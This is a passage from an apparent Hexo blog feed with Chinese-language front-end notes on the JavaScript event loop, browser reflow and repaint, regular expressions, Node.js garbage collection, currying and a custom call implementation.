class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 会在 for 循环执行结束之后打印 console，可见只有执行栈中的同步任务执行完毕才会去读取任务队列中的异步任务</span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;完毕！&apos;)</span><br><span class="line">&#125;, 0)</span><br><span class="line">console.time(&apos;for&apos;)</span><br><span class="line">for (let i = 0; i &lt; 10000000000; i++) &#123; // 执行时间约为 11s </span><br><span class="line">&#125;</span><br><span class="line">console.timeEnd(&apos;for&apos;)</span><br></pre></td></tr></table></figure><p> 除了广义的同步和异步任务，异步任务可以分为以下两类: </p><ul><li>macro-task（宏任务）：script, setTimeout, setInterval, requestAnimationFrame, I/O, UI rendering</li><li><p>micro-task(微任务)：Promise.then, process.nextTick, MutationObserver</p><p>所有微任务清空后才会执行宏任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Promise.resolve(Promise.resolve(&apos;resolve!&apos;)).then(v =&gt; v).then(v =&gt; &#123;console.log(v)&#125;)</span><br><span class="line"></span><br><span class="line">Promise.resolve().then(()=&gt;&#123;</span><br><span class="line">  console.log(&apos;Promise1&apos;)  </span><br><span class="line">  setTimeout(()=&gt;&#123;</span><br><span class="line">    console.log(&apos;setTimeout1&apos;)</span><br><span class="line">  &#125;,0)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">  console.log(&apos;setTimeout2&apos;)</span><br><span class="line">  Promise.resolve().then(()=&gt;&#123;</span><br><span class="line">    console.log(&apos;Promise2&apos;)    </span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,0)</span><br><span class="line">// Promise1 resolve! setTimeout2 Promise2 setTimeout1</span><br></pre></td></tr></table></figure></li></ul><hr><blockquote><p>构造函数<br>    <strong>new操作符</strong>：<br>    (1)创建一个新对象<br>    (2)将构造函数的作用域赋值给新对象（因此this指向新对象）<br>    (3)执行构造函数中的代码（为这个新对象添加属性和方法）<br>    (4)返回新对象</p></blockquote><pre><code>**构造函数原型上的方法和属性会出现在实例的 __proto__ 上**</code></pre><hr><h2 id="Dom"><a href="#Dom" class="headerlink" title="Dom"></a>Dom</h2><h3 id="1-浏览器的回流和重绘，如何进行优化？"><a href="#1-浏览器的回流和重绘，如何进行优化？" class="headerlink" title="1. 浏览器的回流和重绘，如何进行优化？"></a>1. 浏览器的回流和重绘，如何进行优化？</h3><h4 id="回流："><a href="#回流：" class="headerlink" title="回流："></a>回流：</h4><blockquote><p>当 Render Tree 中部分或全部元素的尺寸、结构、或某些属性发生改变时，浏览器重新渲染部分或全部文档的过程称为回流。回流比重绘的代价要更高。</p><ul><li>页面首次渲染</li><li>浏览器窗口大小发生改变</li><li>元素尺寸或位置发生改变</li><li>元素内容变化（文字数量或图片大小等等）</li><li>元素字体大小变化</li><li>添加或者删除可见的DOM元素</li><li>激活CSS伪类（例如：:hover）</li><li>查询某些属性或调用某些方法<br>一些常用且会导致回流的属性和方法:</li><li>clientWidth、clientHeight、clientTop、clientLeft</li><li>offsetWidth、offsetHeight、offsetTop、offsetLeft</li><li>scrollWidth、scrollHeight、scrollTop、scrollLeft</li><li>scrollIntoView()、scrollIntoViewIfNeeded()</li><li>getComputedStyle()</li><li>getBoundingClientRect()</li><li>scrollTo()</li></ul></blockquote><h4 id="重绘："><a href="#重绘：" class="headerlink" title="重绘："></a>重绘：</h4><blockquote><p>当页面中元素的样式的改变不影响它在页面中的位置时，（如：color，background-color，visibility等），浏览器会将新样式赋予并重新绘制它，这个过程叫做重绘。</p></blockquote><h4 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h4><p>css:</p><ul><li>避免使用table布局。</li><li>尽可能在DOM树的最末端改变class。</li><li>避免设置多层内联样式。</li><li>将动画效果应用到position属性为absolute或fixed的元素上。</li><li>避免使用CSS表达式（例如：calc()）。</li></ul><p>js:</p><ul><li>避免频繁操作样式，最好一次性重写style属性，或者将样式列表定义为class并一次性更改class属性。</li><li>避免频繁操作DOM，创建一个documentFragment，在它上面应用所有DOM操作，最后再把它添加到文档中。</li><li>也可以先为元素设置display: none，操作结束后再把它显示出来。因为在display属性为none的元素上进行的DOM操作不会引发回流和重绘。</li><li>避免频繁读取会引发回流/重绘的属性，如果确实需要多次使用，就用一个变量缓存起来。</li><li>对具有复杂动画的元素使用绝对定位，使它脱离文档流，否则会引起父元素及后续元素频繁回流。</li></ul><h2 id="前端框架-React-Vue"><a href="#前端框架-React-Vue" class="headerlink" title="前端框架(React/Vue)"></a>前端框架(React/Vue)</h2><ul><li>Virtual Dom </li><li>组件实例生命周期</li><li>组件通信</li><li>React 或 Vue 某个 API 的使用要点，比如：setState，componentDidMount 和 componentDidUpdate 的使用场景和异同，portal</li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul><li>git、webpack、babel 使用</li><li>前端性能优化与安全性</li><li>基础算法知识</li><li>http/s协议</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HTTP，HTML和浏览器&quot;&gt;&lt;a href=&quot;#HTTP，HTML和浏览器&quot; class=&quot;headerlink&quot; title=&quot;HTTP，HTML和浏览器&quot;&gt;&lt;/a&gt;HTTP，HTML和浏览器&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;DOM 事件类型和事件流&lt;/li&gt;
&lt;l
      
    
    </summary>
    
      <category term="Front-end" scheme="https://fuzhongfeng.github.io/categories/Front-end/"/>
    
    
      <category term="Front-end" scheme="https://fuzhongfeng.github.io/tags/Front-end/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-RegExp</title>
    <link href="https://fuzhongfeng.github.io/2018/12/30/javascript-RegExp/"/>
    <id>https://fuzhongfeng.github.io/2018/12/30/javascript-RegExp/</id>
    <published>2018-12-30T11:55:01.000Z</published>
    <updated>2022-01-23T13:36:36.193Z</updated>
    
    <content type="html"><![CDATA[<p>虽然把正则表达式划分到了 JavaScript 里但要明确的一点是，正则在多种语言中都是通用的，js 仅仅是通过 RegExp 类型来支持正则表达式。对于正则表达式刚接触的时候会自己手写一些，但当遇到一些通用的需求（如手机号、邮箱等）之后就会习惯于直接套用网上现成的正则表达式，但是使用过程中最近感受到了正则的强大和自己会写正则的重要之处，下面举一个实际场景</p><h2 id="1-需求场景："><a href="#1-需求场景：" class="headerlink" title="1. 需求场景："></a>1. 需求场景：</h2><ul><li>判断如下 html 字符串中是否含有“答案”按钮，标准是找到 div 标签上有 answer-btn class 同时此 div 的子元素 div 含有 x9 的子类：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var str = &apos;&lt;div class=&quot;a0 answer-btn&quot; style=&quot;width:94px;height:53px;z-index:2;&quot; data-uid=&quot;096c171c6f4647fcb6b27d61332cd55d&quot; data-control-btn=&quot;&#123;&amp;quot;event&amp;quot;:&amp;quot;click&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;show&amp;quot;,&amp;quot;target&amp;quot;:[[&amp;quot;1e8d5b4003fa4273966813c8a6fd43a2&amp;quot;]]&#125;&quot;&gt;&lt;div class=&quot;ub dh w3 ds eo x9&quot; style=&quot;&quot;&gt;&lt;span&gt;答案&lt;/span&gt;&lt;span class=&quot;xb3&quot; style=&quot;&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&apos;</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-思路："><a href="#2-思路：" class="headerlink" title="2.思路："></a>2.思路：</h2><ul><li>乍一想可以用 includes 方法实现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (str.includes(&apos;answer-btn&apos;) &amp;&amp; str.includes(&apos;x9&apos;)) &#123;</span><br><span class="line">    // 执行操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>但明显逻辑不严谨，如果字符串的复杂性足够大，那个包含”answer-btn” 和 “x9”但有不是 class 的情况很容易出现</p><ul><li>此时最优方案明显是正则表达式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ol><li><p>正则表达式的匹配模式支持下列 3 个标志：<br>g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止<br>i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写<br>m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。</p></li><li><p>模式中所有元字符都必须转义，正则中的元字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( [ &#123; \ ^ $ | ) ? * + . ] &#125;</span><br></pre></td></tr></table></figure></li><li><p>特殊字符<br>所谓特殊字符就是一些有特殊含义的字符<br>?  匹配前面的字符串零次或者一次，或指明一个非贪婪限定符。要匹配 ? 字符串请使用 \?</p><ul><li>匹配前面的字符串一次或多次。默认为贪婪模式。</li></ul><p>(?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用’或’字符(|)来组合一个模式的各个部分是很有用的。例如 industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简洁的表达式。</p><p>.  (小数点）匹配除换行符之外的任何单个字符。<br>例如，/.n/将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。</p><ul><li>匹配前面的一个表达式0次或者多次，等价于{0,}。默认是贪婪的<br>例如，/bo*/会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中将不会匹配任何东西</li></ul></li></ol><h3 id="常用正则"><a href="#常用正则" class="headerlink" title="常用正则"></a>常用正则</h3><ol><li>将 17346547310 替换为 173<em>**</em>7310<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;17346547310&quot;.replace(/(\d&#123;3&#125;)\d&#123;4&#125;(\d&#123;4&#125;)/g, &quot;$1****$2&quot;) // &quot;173****7310&quot;</span><br></pre></td></tr></table></figure></li></ol><p>$1、$2 为正则表达式()里的内容，此处分别代表前三位和后四位</p><ol start="2"><li><p>用正则获取 url 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getQueryString(name) &#123;</span><br><span class="line">    var source = window.location.search.substr(1);</span><br><span class="line">    var reg = new RegExp(&apos;(^|&amp;)&apos; + name + &apos;=([^&amp;]*)(&amp;|$)&apos;, &apos;i&apos;);</span><br><span class="line">    var r = source.match(reg);</span><br><span class="line"></span><br><span class="line">    if (r != null) &#123;</span><br><span class="line">        return decodeURIComponent(r[2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line">// &apos;(^|&amp;)&apos; 这里的引号用于拼接字符串，^|&amp; 表示字符串以空字符串或&amp;开头。</span><br><span class="line">// ([^&amp;]*) ^ 在方括号表达式中使用时表示不匹配方括号内的字符集合；这里表示不匹配 &amp;。* 表示零或多次</span><br><span class="line">// (&amp;|$) 表示以&amp;或空字符串结尾</span><br><span class="line">// i 不区分大小写</span><br><span class="line">// r[0] 为匹配到的所有字符，r[1] 为第一个()匹配的内容，r[2] 为第二个()匹配的内容即=后的结果。</span><br><span class="line">// decodeURIComponent 解析被 encodeURIComponent 的内容</span><br></pre></td></tr></table></figure></li><li><p>匹配Unicode编码中的汉字范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var reg = /^[\u2E80-\u9FFF]+$/;</span><br></pre></td></tr></table></figure></li><li><p>将 ‘10000000000’ 形式的字符串, 以每3位进行分隔展示 ‘10.000.000.000’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;10000000000&apos;.replace(/(\d)(?=(\d&#123;3&#125;)+\b)/g, &apos;$1.&apos;)</span><br><span class="line">// 定位符 \b 表示匹配一个单词边界，即字与空格间的位置。\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。</span><br><span class="line">// 非捕获元 ?=， exp1(?=exp2) 表示查找 exp2 前面的 exp1。</span><br><span class="line">// $1 这里的为 replace 的第二个参数，此参数为字符串参数，$n 为100以内的正整数，为特殊变量。表示第 n 个括号内的匹配。</span><br></pre></td></tr></table></figure></li><li><p>替换 dom 字符串中的图片地址</p></li></ol><ul><li>向 dom 字符串中的 background-image url() 和 img src 追加参数。（使用jquery初始化会发送请求）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">const domStr = &apos;&lt;div class=&quot;slide &quot; style=&quot;width: 1200px; height: 900px; background: url(&amp;quot;https://storage.aixuexi.com/u/89JTeFCY291?imageView2/2/w/1000/q/50&amp;amp;ps=-s25q25&amp;quot;) center center / cover no-repeat;&quot;&gt;&lt;div class=&quot;a0&quot;&gt;&lt;img style=&quot;width: 100%;height: 100%;&quot; src=&quot;https://storage.aixuexi.com/u/fb0NXFhfe92?ps=-s25q25&quot;&gt;&lt;/div&gt;&lt;/div&gt;&apos;</span><br><span class="line">const _quality = &apos;ps=-s25q25&apos;</span><br><span class="line"></span><br><span class="line">// 背景图</span><br><span class="line">domStr.replace(</span><br><span class="line">    /(url\(&amp;quot;)(.*?)(&amp;quot;\))/g,</span><br><span class="line">    (match, p1, p2, p3) =&gt; &#123;</span><br><span class="line">        const _p2 = `$&#123;p2&#125;$&#123;p2.includes(&apos;?&apos;) ? `&amp;amp;$&#123;_quality&#125;` : `?$&#123;_quality&#125;`&#125;`;</span><br><span class="line"></span><br><span class="line">        return `$&#123;p1&#125;$&#123;_p2&#125;$&#123;p3&#125;`;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 图片组件</span><br><span class="line">domStr.replace(</span><br><span class="line">    /(&lt;img)(.*?)(&gt;)/g,</span><br><span class="line">    (match, p1, p2, p3) =&gt; &#123;</span><br><span class="line">        const _p2 = p2.replace(</span><br><span class="line">        /(src=&quot;)(.*?)(&quot;)/g,</span><br><span class="line">        (match, $1, $2, $3) =&gt; &#123;</span><br><span class="line">            const _$2 = `$&#123;$2&#125;$&#123;$2.includes(&apos;?&apos;) ? `&amp;$&#123;_quality&#125;` : `?$&#123;_quality&#125;`&#125;`</span><br><span class="line"></span><br><span class="line">            return `$&#123;$1&#125;$&#123;_$2&#125;$&#123;$3&#125;`</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        return `$&#123;p1&#125;$&#123;_p2&#125;$&#123;p3&#125;`;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">* ? 非贪婪限定符，保证匹配到一个 &lt;img /&gt; 标签, .* 会匹配到最后一个 &gt; 不准确</span><br><span class="line">* replace 第二个参数接受函数，需返回 string，match 参数表示当前正则所匹配到的完整字符串，p(n) 参数对应正则中的第 n 括号的内容</span><br></pre></td></tr></table></figure></li></ul><ol start="6"><li><p>实现字符串的 trim 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.myTrim = function() &#123;</span><br><span class="line">    return this.replace(/(^\s+)|(\s+$)/g,&apos;&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>vue 源码中的 camelize 方法(‘abce-fgh-ijk’ 转为小驼峰：’abceFghIjk’)<br>var camelize = function (str) {<br>return str.replace(/-(\w)/g, function (_, c) { return c ? c.toUpperCase() : ‘’ })<br>};</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽然把正则表达式划分到了 JavaScript 里但要明确的一点是，正则在多种语言中都是通用的，js 仅仅是通过 RegExp 类型来支持正则表达式。对于正则表达式刚接触的时候会自己手写一些，但当遇到一些通用的需求（如手机号、邮箱等）之后就会习惯于直接套用网上现成的正则表达
      
    
    </summary>
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://fuzhongfeng.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs-基础</title>
    <link href="https://fuzhongfeng.github.io/2018/07/13/node-base/"/>
    <id>https://fuzhongfeng.github.io/2018/07/13/node-base/</id>
    <published>2018-07-13T12:23:54.000Z</published>
    <updated>2022-01-23T12:24:23.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nodejs-垃圾回收机制"><a href="#nodejs-垃圾回收机制" class="headerlink" title="nodejs 垃圾回收机制"></a>nodejs 垃圾回收机制</h2><blockquote><p>v8 的内存使用是有限制的，64位系统下约为1.4GB，32位系统下约为0.7GB。垃圾回收机制尤为重要。</p><ul><li>内存分代：在V8中，主要将内存分为新生代和老生代两代。新生代中的对象为存活时间较短的对象，<br>老生代中的对象为存活时间较长或常驻内存的对象。</li></ul></blockquote><ol><li>Scavenge 算法</li></ol><ul><li>在分代的基础上，新生代中的对象主要通过Scavenge算法进行垃圾回收</li></ul><ol start="2"><li>V8在老生代中主要采 用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。Mark-Sweep是标记清除的意思。Mark-Compact是标记整理的意思。由于Mark-Compact需要移动对象， 所以它的执行速度不可能很快，所以在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新 生代中晋升过来的对象进行分配时才使用Mark-Compact。</li></ol><h2 id="nodejs-事件循环"><a href="#nodejs-事件循环" class="headerlink" title="nodejs 事件循环"></a>nodejs 事件循环</h2><p><a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#setimmediate-vs-settimeout" target="_blank" rel="noopener">https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#setimmediate-vs-settimeout</a></p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><blockquote><p>死锁是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去</p></blockquote><p>产生死锁的四个必要条件：</p><ul><li>不可剥夺条件：进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由占用该资源的进程自己来释放。</li><li>互斥条件：一段时间内某资源只由一个进程占用。如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程释放。</li><li>请求与保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求而该资源已被其他进程占有，此时请求进程被阻塞，但对已获得的资源保持不放。</li><li>循环等待条件：指在发生死锁时，必然存在一个进程之间资源的循环调用，即进程集合{P0，P1，P2，···，Pn}中的P0正在等待一个P1占用的资源；P1正在等待P2占用的资源，···，Pn正在等待已被P0占用的资源。</li></ul><h2 id="nodejs-调试"><a href="#nodejs-调试" class="headerlink" title="nodejs 调试"></a>nodejs 调试</h2><h3 id="一、vscode"><a href="#一、vscode" class="headerlink" title="一、vscode"></a>一、vscode</h3><p><img src="/2018/07/13/node-base/step1.png" alt="step1"><br><img src="/2018/07/13/node-base/step2.png" alt="step2-3"></p><ul><li>此时项目根目录下会创建出 .vscode/launch.json文件</li></ul><p><img src="/2018/07/13/node-base/step3.png" alt="step4-5"><br><img src="/2018/07/13/node-base/step4.png" alt="step6"></p><ul><li>访问node服务即可触发断点进行调试</li></ul><p><img src="/2018/07/13/node-base/step5.png" alt="step7"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;nodejs-垃圾回收机制&quot;&gt;&lt;a href=&quot;#nodejs-垃圾回收机制&quot; class=&quot;headerlink&quot; title=&quot;nodejs 垃圾回收机制&quot;&gt;&lt;/a&gt;nodejs 垃圾回收机制&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;v8 的内存使用是有限制的
      
    
    </summary>
    
      <category term="Nodejs" scheme="https://fuzhongfeng.github.io/categories/Nodejs/"/>
    
    
      <category term="Nodejs" scheme="https://fuzhongfeng.github.io/tags/Nodejs/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript-基础</title>
    <link href="https://fuzhongfeng.github.io/2018/06/28/javascript-base/"/>
    <id>https://fuzhongfeng.github.io/2018/06/28/javascript-base/</id>
    <published>2018-06-28T13:54:13.000Z</published>
    <updated>2022-01-23T12:24:23.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="null-和-0-比较"><a href="#null-和-0-比较" class="headerlink" title="null 和 0 比较"></a>null 和 0 比较</h2><p><em>最近在项目中修改 bug 时发现的一个不太理解的问题：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params.estimatedStudentTime = values.estimatedStudentTime &gt;= 0 ? </span><br><span class="line">    values.estimatedStudentTime : -1</span><br></pre></td></tr></table></figure><p>本意是想根据 values.estimatedStudentTime 的值如果存在并且值大于等于零时才赋值给 params.estimatedStudentTime，当 values.estimatedStudentTime 的值不存在时则取 -1 再传递给接口。<br>乍一看判断没问题啊，然而控制台却发现还是将 null 值传递了出去。因为在某一处给 values.estimatedStudentTime 赋值为 null，但是 values.estimatedStudentTime &gt;= 0 为什么不能过滤掉 null ？？？ 难道 null &gt;= 0 返回true ？？？ 果然 null &gt;= 0 返回 true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.log(null &gt; 0);   // false</span><br><span class="line">console.log(null &lt; 0);   // false</span><br><span class="line">console.log(null &gt;= 0);   // true</span><br><span class="line">console.log(null &lt;= 0);   // true</span><br><span class="line">console.log(null == 0);   // false</span><br><span class="line">console.log(null === 0);    // false</span><br></pre></td></tr></table></figure></p><p>why ？？？<br>首先明确概念：<br>关系运算符： &lt;、&gt;、&gt;=、&lt;=<br>相等运算符：==、!=、===、!==</p><h3 id="关系运算符比较时会尝试将值转为-number-，Number-null-值为-0"><a href="#关系运算符比较时会尝试将值转为-number-，Number-null-值为-0" class="headerlink" title="关系运算符比较时会尝试将值转为 number ，Number(null)  值为 0"></a>关系运算符比较时会尝试将值转为 number ，Number(null)  值为 0</h3><p>然而 Number(undefined) 值却为 NaN, NaN &gt;= 0 返回 false</p><h2 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h2><ul><li>创建方式：调用另一个函数并为它传入要柯里化的函数和必要参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function curry(fn)&#123;</span><br><span class="line">  var args = Array.prototype.slice.call(arguments, 1);</span><br><span class="line">  return function()&#123;</span><br><span class="line">      var innerArgs = Array.prototype.slice.call(arguments);</span><br><span class="line">      var finalArgs = args.concat(innerArgs);</span><br><span class="line">      return fn.apply(null, finalArgs);</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line">function add(num1, num2)&#123; // 柯里化的函数</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">var curriedAdd = curry(add, 5);</span><br><span class="line">curriedAdd(3) // 8</span><br></pre></td></tr></table></figure></li></ul><p>*问题1：实现一个 fn 函数返回如下结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;, &apos;b&apos;)(&apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;)(&apos;b&apos;)(&apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;)(&apos;b&apos;, &apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br></pre></td></tr></table></figure></p><p>函数式 柯里化解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function add (a, b, c) &#123;</span><br><span class="line">    console.log([a, b, c])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 第一种</span><br><span class="line">function curry(func) &#123;</span><br><span class="line">    var argLen = func.length // 函数参数的个数</span><br><span class="line"></span><br><span class="line">    return function _fn(...rest) &#123;</span><br><span class="line">         if(rest.length &lt; argLen) &#123;</span><br><span class="line">           return _fn.bind(null, ...rest)</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             return func.apply(null, rest)   </span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 第二种</span><br><span class="line">function curry(fn) &#123;</span><br><span class="line">    var len = fn.length;</span><br><span class="line"></span><br><span class="line">    return function _f() &#123;</span><br><span class="line">        if (arguments.length === len) &#123;</span><br><span class="line">            return fn.apply(null, arguments)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return _f.bind(null, ...arguments)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var fn = curry(add)</span><br></pre></td></tr></table></figure></p><h2 id="实现-Function-prototype-call"><a href="#实现-Function-prototype-call" class="headerlink" title="实现 Function.prototype.call"></a>实现 Function.prototype.call</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myCall = function(obj, ...args) &#123;</span><br><span class="line">    if (typeof this !== &apos;function&apos;) throw new Error(&apos;type error&apos;)</span><br><span class="line"></span><br><span class="line">    // 默认值 window</span><br><span class="line">    obj = obj || window</span><br><span class="line"></span><br><span class="line">    // 防止覆盖 obj 已有 fn 属性</span><br><span class="line">    const _fn = Symbol(&apos;fn&apos;)</span><br><span class="line"></span><br><span class="line">    // call 位于函数实例的原型上，因此调用时 call 函数内的 this 指向函数实例自身</span><br><span class="line">    obj[_fn] = this</span><br><span class="line"></span><br><span class="line">    const _result = obj[_fn](...args)</span><br><span class="line">    delete obj[_fn]</span><br><span class="line">    </span><br><span class="line">    return _result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span 